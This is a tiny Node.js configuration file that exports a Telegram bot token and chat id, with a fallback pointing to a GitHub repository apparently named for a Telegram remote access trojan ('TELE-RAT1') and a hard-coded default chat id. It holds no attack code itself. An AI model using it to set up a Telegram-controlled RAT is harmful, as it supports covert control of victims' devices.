const parsedId = Number(process.env.ID);
module.exports = {
  token: process.env.TOKEN || 'https://github.com/din123esh/TELE-RAT1/tree/main',
  id: isNaN(parsedId) ? 1603022382 : parsedId // replace 12345.. with your telegram chat id
};
